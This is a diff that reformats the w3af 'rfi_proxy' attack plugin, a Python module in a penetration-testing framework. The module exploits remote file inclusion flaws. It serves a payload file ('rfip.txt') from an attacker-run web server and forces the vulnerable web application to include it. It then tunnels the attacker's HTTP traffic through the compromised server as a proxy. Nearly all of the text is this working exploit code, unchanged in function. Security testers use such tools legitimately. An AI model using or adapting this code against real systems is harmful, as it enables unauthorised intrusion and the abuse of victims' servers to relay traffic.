@@ -46,69 +46,68 @@ from core.data.kb.shell import shell as shell
 url = ''
 exploitData = ''
 rfiConnGenerator = ''
-# This separator is a Unique string used for parsing. 
-RFI_SEPARATOR = rand_alnum( 25 )
+# This separator is a Unique string used for parsing.
+RFI_SEPARATOR = rand_alnum(25)
 URLOPENER = None
 
 
 class rfi_proxy(AttackPlugin, Process):
     '''
     Exploits remote file inclusions to create a proxy server.
-    
-    @author: Andres Riancho (andres.riancho@gmail.com)    
+
+    @author: Andres Riancho (andres.riancho@gmail.com)
     '''
 
-    def __init__( self ):
+    def __init__(self):
         AttackPlugin.__init__(self)
-        Process.__init__( self )
+        Process.__init__(self)
         self.daemon = True
-        
+
         self._shell = None
         self._proxyAddress = '127.0.0.1'
         self._proxyPort = ports.RFIPROXY
         self._rfiConnGenerator = 'http://host.tld/'
         self._httpdPort = ports.RFIPROXY2
-        
+
         self._proxy = None
         self._wS = None
         self._go = True
-        
+
         self._url = None
         self._method = None
         self._exploitQs = None
-        self._proxyPublicIP = cf.cf.get( 'local_ip_address' )
-        
-    def fast_exploit(self, url, method, data ):
+        self._proxyPublicIP = cf.cf.get('local_ip_address')
+
+    def fast_exploit(self, url, method, data):
         '''
         Exploits a web app with os_commanding vuln.
-        
+
         @param url: A string containing the URL to exploit
         @param method: A string containing the method to send the data
         @param data: A string containing data to send with a mark that defines
         which is the vulnerable parameter ( aa=notMe&bb=almost&cc=[VULNERABLE] )
         '''
         return self._shell
-    
+
     def get_attack_type(self):
         '''
         @return: The type of exploit, SHELL, PROXY, etc.
-        '''        
+        '''
         return 'proxy'
-        
-    def get_kb_location( self ):
+
+    def get_kb_location(self):
         '''
         This method should return the vulnerability name (as saved in the kb) to exploit.
         For example, if the audit.os_commanding plugin finds an vuln, and saves it as:
-        
+
         kb.kb.append( 'os_commanding' , 'os_commanding', vuln )
-        
+
         Then the exploit plugin that exploits os_commanding ( attack.os_commanding ) should
         return 'os_commanding' in this method.
-        '''        
+        '''
         return 'rfi'
-                
-      
-    def _generate_shell( self, vuln ):
+
+    def _generate_shell(self, vuln):
         '''
         @param vuln: The vuln to exploit.
         @return: True if the user can start using the proxy.
@@ -118,13 +117,13 @@ class rfi_proxy(AttackPlugin, Process):
         self._method = vuln.get_method()
         self._exploitData = vuln.get_dc()
         self._variable = vuln.get_var()
-        
+
         self.start()
-        
-        p = RFIProxyShell( self._proxyAddress + ':' + str(self._proxyPort) )
-        
+
+        p = RFIProxyShell(self._proxyAddress + ':' + str(self._proxyPort))
+
         return p
-        
+
     def stop(self):
         if self._running:
             self._proxy.server_close()
@@ -136,11 +135,11 @@ class rfi_proxy(AttackPlugin, Process):
             except:
                 pass
             self._running = False
-        
-    def specific_user_input( self, command, parameters ):
+
+    def specific_user_input(self, command, parameters):
         '''
         This method is called when a user writes a command in the shell and hits enter.
-        
+
         Before calling this method, the framework calls the generic_user_input method
         from the shell class.
 
@@ -169,16 +168,18 @@ class rfi_proxy(AttackPlugin, Process):
     def run(self):
         '''
         Starts the http server that will become a proxy.
-        
+
         '''
         if self._rfiConnGenerator == '':
             # If user failed to configure self._rfiConnGenerator we will run a webserver
             # and configure the _rfiConnGenerator attr for him
             om.out.information('Running a local httpd to serve the RFI connection generator to remote web app.')
             webroot = os.path.join('plugins', 'attack', 'rfi_proxy')
-            webserver.start_webserver(self._proxyPublicIP, self._httpdPort, webroot)
-            self._rfiConnGenerator = 'http://' + self._proxyPublicIP + ':' + str(self._httpdPort) + '/rfip.txt'
-            
+            webserver.start_webserver(
+                self._proxyPublicIP, self._httpdPort, webroot)
+            self._rfiConnGenerator = 'http://' + \
+                self._proxyPublicIP + ':' + str(self._httpdPort) + '/rfip.txt'
+
         ### TODO: I really dislike this:
         global url
         global exploitData
@@ -201,47 +202,53 @@ class rfi_proxy(AttackPlugin, Process):
         exploitData = self._exploitData
         rfiConnGenerator = self._rfiConnGenerator
         variable = self._variable
-        
-        self._proxy = HTTPServer((self._proxyAddress, self._proxyPort ),  w3afProxyHandler )
-        message = 'Proxy server running on '+ self._proxyAddress + ':'+ str(self._proxyPort) +' .'
+
+        self._proxy = HTTPServer(
+            (self._proxyAddress, self._proxyPort), w3afProxyHandler)
+        message = 'Proxy server running on ' + self._proxyAddress + \
+            ':' + str(self._proxyPort) + ' .'
         message += ' You may now configure this proxy in w3af or your browser. '
-        om.out.information( message )
-        
+        om.out.information(message)
+
         self._running = True
         while self._go:
             try:
                 self._proxy.handle_request()
             except:
                 self._proxy.server_close()
-    
+
     def get_options(self):
         '''
         @return: A list of option objects for this plugin.
         '''
         desc_1 = 'IP address that the proxy will use to receive requests'
-        option_1 = opt_factory('proxyAddress', self._proxyAddress, desc_1, 'string')
-        
+        option_1 = opt_factory(
+            'proxyAddress', self._proxyAddress, desc_1, 'string')
+
         desc_2 = 'Port that the proxy will use to receive requests'
         option_2 = opt_factory('proxyPort', self._proxyPort, desc_2, 'integer')
-        
+
         desc_3 = 'Port that the local httpd will listen on.'
         help_3 = 'When exploiting a remote file include for generating a proxy, w3af can'
         help_3 += ' use a local web server to serve the included file. This setting will'
         help_3 += ' configure the TCP port where this webserver listens.'
-        option_3 = opt_factory('httpdPort', self._httpdPort, desc_3, 'integer', help=help_3)
+        option_3 = opt_factory(
+            'httpdPort', self._httpdPort, desc_3, 'integer', help=help_3)
 
         desc_4 = 'This is the ip that the remote server will connect to in order to'
         desc_4 += ' retrieve the file inclusion payload "rfip.txt".'
         help_4 = 'When exploiting a remote file include for generating a proxy, w3af can use'
         help_4 += ' a local web server to serve the included file. This setting will configure'
         help_4 += ' the IP address where this webserver listens.'
-        option_4 = opt_factory('proxyPublicIP', self._proxyPublicIP, desc_4, 'string',  help=help_4)
+        option_4 = opt_factory('proxyPublicIP', self._proxyPublicIP,
+                               desc_4, 'string', help=help_4)
 
         desc_5 = 'URL for the remote file inclusion connection generator.'
         help_5 = 'If left blank, a local webserver will be run at proxyPublicIP:httpdPort'
         help_5 += ' and the connection generator will be served to the remote web application'
-        help_5 +=' this way.'
-        option_5 = opt_factory('rfiConnGenerator', self._rfiConnGenerator, desc_5, 'url', help=help_5)
+        help_5 += ' this way.'
+        option_5 = opt_factory('rfiConnGenerator', self._rfiConnGenerator,
+                               desc_5, 'url', help=help_5)
 
         options = OptionList()
         options.add(option_1)
@@ -251,8 +258,7 @@ class rfi_proxy(AttackPlugin, Process):
         options.add(option_5)
         return options
 
-        
-    def get_root_probability( self ):
+    def get_root_probability(self):
         '''
         @return: This method returns the probability of getting a root shell
                  using this attack plugin. This is used by the "exploit *"
@@ -262,37 +268,37 @@ class rfi_proxy(AttackPlugin, Process):
                  WILL ALWAYS return a root shell.
         '''
         return 0.0
-        
-    def set_options( self, options_list ):
+
+    def set_options(self, options_list):
         '''
-        This method sets all the options that are configured using the user interface 
+        This method sets all the options that are configured using the user interface
         generated by the framework using the result of get_options().
-        
+
         @param options_list: A dictionary with the options for the plugin.
         @return: No value is returned.
-        ''' 
+        '''
         self._proxyAddress = options_list['proxyAddress'].get_value()
         self._proxyPort = options_list['proxyPort'].get_value()
         self._httpdPort = options_list['httpdPort'].get_value()
         self._proxyPublicIP = options_list['proxyPublicIP'].get_value()
         self._rfiConnGenerator = options_list['rfiConnGenerator'].get_value()
-    
-    def set_url_opener( self, urlOpener):
+
+    def set_url_opener(self, urlOpener):
         '''
         This method should not be overwritten by any plugin (but you are free to do it, for example
         a good idea is to rewrite this method to change the UrlOpener to do some IDS evasion technic).
-        
-        This method takes a CustomUrllib object as parameter and assigns it to itself. 
-        Then, on the testUrl method you use self.CustomUrlOpener._custom_urlopen(...) 
+
+        This method takes a CustomUrllib object as parameter and assigns it to itself.
+        Then, on the testUrl method you use self.CustomUrlOpener._custom_urlopen(...)
         to open a Url and you are sure that the plugin is using the user supplied
         settings (proxy, user agent, etc).
-        
+
         @return: No value is returned.
         '''
         global URLOPENER
         URLOPENER = urlOpener
-        
-    def get_long_desc( self ):
+
+    def get_long_desc(self):
         '''
         @return: A DETAILED description of the plugin functions and features.
         '''
@@ -300,7 +306,7 @@ class rfi_proxy(AttackPlugin, Process):
         This plugin exploits remote file inclusion vulnerabilities and returns a proxy object, proxy
         objects listen on a local port, and create a tunnel from the local machine to the remote
         end, where the connections are actually created.
-        
+
         Five configurable parameters exist:
             - proxyAddress
             - proxyPort
@@ -308,83 +314,86 @@ class rfi_proxy(AttackPlugin, Process):
             - proxyPublicIP
             - rfiConnGenerator
         '''
-        
+
+
 class RFIProxyShell(shell):
-    
+
     def __init__(self, proxy_url):
         self._proxy_url = proxy_url
-    
-    def generic_user_input( self, command, params ):
+
+    def generic_user_input(self, command, params):
         '''
         This method is called when a user writes a command in the shell and hits enter.
-        
+
         @param command: The command to handle ( ie. "read", "exec", etc ).
         @param params: Parameters for @command
         @return: The result of the command.
         '''
         msg = 'You should use your browser to interact with this plugin.'
         return msg
-    
-    def end( self ):
+
+    def end(self):
         om.out.debug('RFIProxyShell cleanup complete.')
-        
-    def get_name( self ):
+
+    def get_name(self):
         return 'RFIProxyShell'
-    
+
     def _identifyOs(self):
         return 'remote_file_inclusion_proxy'
-        
-    def __repr__( self ):
-        return '<'+self.get_name()+' object (Use proxy: "'+self._proxy_url+'")>'
-        
-    def getRemoteSystem( self ):
+
+    def __repr__(self):
+        return '<' + self.get_name() + ' object (Use proxy: "' + self._proxy_url + '")>'
+
+    def getRemoteSystem(self):
         return 'browser'
 
-    def getRemoteUser( self ):
+    def getRemoteUser(self):
         return 'user'
-        
-    def getRemoteSystemName( self ):
+
+    def getRemoteSystemName(self):
         return 'browser'
-        
+
     __str__ = __repr__
+
 
 class w3afProxyHandler(BaseHTTPRequestHandler):
 
-    def _work( self, host, port, send, proxyClientConnection ):
-        
+    def _work(self, host, port, send, proxyClientConnection):
+
         postDataDict = {}
         postDataDict['rfipsend'] = send
         postDataDict['rfihost'] = host
         postDataDict['rfiport'] = port
         postDataDict['rfipsep'] = RFI_SEPARATOR
-        postdata = urllib.urlencode( postDataDict )
-        
+        postdata = urllib.urlencode(postDataDict)
+
         QueryStringDict = exploitData
-        QueryStringDict[ variable ] = rfiConnGenerator
-        qs = str( QueryStringDict )
-        
+        QueryStringDict[variable] = rfiConnGenerator
+        qs = str(QueryStringDict)
+
         completeUrl = url + '?' + qs
         #req = urllib2.Request( completeUrl , postdata )
 
         try:
-            response = URLOPENER.POST( completeUrl, postdata )
+            response = URLOPENER.POST(completeUrl, postdata)
             #response = urllib2.urlopen( req )
         except w3afException, e:
             proxyClientConnection.close()
-            om.out.error( 'Oops! Error when proxy tried to open remote site: ' + str(e) )
+            om.out.error('Oops! Error when proxy tried to open remote site: ' +
+                         str(e))
         else:
             page = response.getBody()
-            theStart = page.find( RFI_SEPARATOR )
-            theEnd = page.rfind( RFI_SEPARATOR )
-            page = page[ theStart + len(RFI_SEPARATOR): theEnd ]
-            page = page[ page.find('HTTP'):]
-            proxyClientConnection.send( page )
+            theStart = page.find(RFI_SEPARATOR)
+            theEnd = page.rfind(RFI_SEPARATOR)
+            page = page[theStart + len(RFI_SEPARATOR): theEnd]
+            page = page[page.find('HTTP'):]
+            proxyClientConnection.send(page)
             proxyClientConnection.close()
 
-    def __init__( self, a, b, c):
+    def __init__(self, a, b, c):
         self._tm = tm
-        BaseHTTPRequestHandler.__init__( self, a, b, c )
-        
+        BaseHTTPRequestHandler.__init__(self, a, b, c)
+
     def handle_one_request(self):
         """
         Handle a single HTTP request.
@@ -393,13 +402,14 @@ class w3afProxyHandler(BaseHTTPRequestHandler):
         if not self.raw_requestline:
             self.close_connection = 1
             return
-        if not self.parse_request(): # An error code has been sent, just exit
+        if not self.parse_request():  # An error code has been sent, just exit
             return
 
         words = self.raw_requestline.split('\n')[0].split()
-        if len( words ) == 3:
+        if len(words) == 3:
             command, url, version = words
-            (scm, netloc, path, params, query, fragment) = urlparse.urlparse(url)
+            (scm, netloc, path, params, query,
+             fragment) = urlparse.urlparse(url)
             if scm != 'http':
                 msg = 'Remote file inclusion proxy has no https support.'
                 msg += ' Contribute <a href="http://w3af.sourceforge.net/">here</a>'
@@ -408,7 +418,7 @@ class w3afProxyHandler(BaseHTTPRequestHandler):
             else:
                 split_netloc = netloc.split(':')
                 port = 80
-                if len( split_netloc ) == 2:
+                if len(split_netloc) == 2:
                     port = split_netloc[1]
                 host = split_netloc[0]
         else:
@@ -419,7 +429,7 @@ class w3afProxyHandler(BaseHTTPRequestHandler):
         self.headers['connection'] = 'close'
         raw_request = self.raw_requestline
         for header in self.headers.keys():
-            raw_request += header+': '
+            raw_request += header + ': '
             raw_request += self.headers.getheader(header)
             raw_request += '\r\n'
         try:
@@ -429,10 +439,10 @@ class w3afProxyHandler(BaseHTTPRequestHandler):
         else:
             raw_request += '\r\n\r\n'
             raw_request += self.rfile.read(length)
-        
+
         raw_request += '\r\n\r\n'
-        
+
         proxyClientConnection = self.connection
         #args = (host, port, raw_request, proxyClientConnection)
         #self._run_async(meth=self._work, args=args)
-        self._work( host, port, raw_request, proxyClientConnection )
+        self._work(host, port, raw_request, proxyClientConnection)
